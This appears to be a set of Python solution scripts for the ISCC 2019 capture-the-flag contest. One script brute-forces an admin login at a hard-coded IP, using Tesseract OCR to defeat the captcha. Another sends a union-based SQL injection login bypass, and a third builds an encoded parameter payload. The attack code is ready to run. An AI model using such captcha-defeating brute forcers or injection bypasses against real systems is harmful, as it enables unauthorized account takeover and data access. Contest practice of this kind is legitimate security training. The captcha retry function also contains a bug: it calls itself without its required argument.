# -*- coding: utf-8 -*-
import pytesseract
from PIL import Image
import requests

header = {'Cookie': 'PHPSESSID=k491qfpfu93d98nihcagf5rk24'}

# 识别验证码
def vcode(pic_url):
    "python验证码识别函数"
    r = requests.get(pic_url, headers=header,timeout=10)
    with open('vcode.png', 'wb') as pic:
        pic.write(r.content)
    im = pytesseract.image_to_string(Image.open('vcode.png'))
    im = im.replace(' ', '')
    if im != '':
        #print(im) #输出图像验证码识别结果
        return im
    else:
        return vcode()

# 提交post
def request_post(url,pic_url,pwd,header):
    user_code = vcode(pic_url)
    data = {
        'username': 'admin',
        'pwd': pwd,
        'user_code': user_code,
        'Login': 'submit'
    }
    re = requests.post(url, headers=header, data=data)
    response = str(re.content, 'utf-8')
    return response

if __name__ == '__main__':
    post_url = "http://39.100.83.188:8002/login.php"
    pic_url = 'http://39.100.83.188:8002/vcode.php'
    for i in range(9,10):
        for j in range(0, 10):
            for k in range(0, 10):
                user_code = vcode(pic_url)
                password = str(i) + str(j) +str(k)
                response = request_post(post_url,pic_url,password,header)
                while  "验证码" in response:
                    response = request_post(post_url,pic_url,password,header)
                print(password,response)

strings = "w3lc0me_To_ISCC2019"
s = ''
for i in strings:
    s += str(ord(i)+256) + "&value[]="
print(s)


import requests
import string
import binascii

cookies = {
    'PHPSESSID': 'k491qfpfu93d98nihcagf5rk24',
    'Auth': '1',
}
playload = ''
results = ''
headers = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 Union.373',
}
data = {
    'username' : "union_373_Tom1",
    'password' : "1' or 1 union select 1,2,'1SCC_20I9' from admin order by 3,'0"
}
response = requests.post('http://39.100.83.188:8054/', headers=headers, cookies=cookies,data=data, verify=False)
print(data['username'])
print(response.content.decode())


